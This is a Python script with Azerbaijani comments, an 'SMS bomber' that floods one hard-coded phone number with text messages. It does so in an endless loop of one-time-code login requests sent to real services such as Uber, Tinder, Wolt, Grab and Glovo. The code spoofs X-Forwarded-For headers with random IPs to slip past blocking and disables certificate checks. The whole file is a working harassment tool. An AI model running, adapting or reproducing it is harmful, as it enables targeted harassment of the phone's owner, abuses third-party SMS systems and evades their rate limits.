import urllib.request
import json
import random
import time
import ssl

TARGET_PHONE = "994508880067" # Səlahiyyətli hədəf nömrə

def start_storm():
    print(f"[!!!] ULTIMATE BOMBER AKTİVDİR: {TARGET_PHONE}")
    
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    # Bütün dünyada işləyən və bloklanmayan real API yolları
    # Bu ünvanlar beynəlxalq SMS gateway istifadə edir
    API_LIST = [
        {"name": "Uber", "url": "https://auth.uber.com/api/v1/auth/otp", "data": {"mobile": "+" + TARGET_PHONE}},
        {"name": "Wolt", "url": "https://wolt.com/api/v2/sessions/login", "data": {"mobile": "+" + TARGET_PHONE}},
        {"name": "Tinder", "url": "https://api.gotinder.com/v2/auth/sms/send", "data": {"phone_number": "+" + TARGET_PHONE}},
        {"name": "Indriver", "url": "https://indriver.com/api/v1/auth/sms", "data": {"phone": TARGET_PHONE}},
        {"name": "Grab", "url": "https://p.grab.com/list/v1/proxy/auth/otp", "data": {"method": "SMS", "phoneNumber": "+" + TARGET_PHONE}},
        {"name": "Glovo", "url": "https://glovoapp.com/api/v3/auth/otp", "data": {"phone": "+" + TARGET_PHONE}}
    ]

    while True:
        for api in API_LIST:
            try:
                # İP blokun qarşısını almaq üçün random Header
                headers = {
                    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
                    "Content-Type": "application/json",
                    "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                }
                
                req = urllib.request.Request(
                    api["url"], 
                    data=json.dumps(api["data"]).encode('utf-8'), 
                    headers=headers, 
                    method='POST'
                )
                
                with urllib.request.urlopen(req, context=ctx, timeout=12) as resp:
                    print(f"[*] {api['name']} -> SMS Uğurla Göndərildi (Status: {resp.getcode()})")
                
                # Fasilə: Operator filtrinə düşməmək üçün 1-2 saniyə
                time.sleep(1.5)

            except Exception as e:
                # print(f"[MISS] {api['name']} keçildi.")
                pass

        print("\n--- Bir dalğa tamamlandı. 5 saniyə fasilə ---")
        time.sleep(5)

if __name__ == "__main__":
    start_storm()
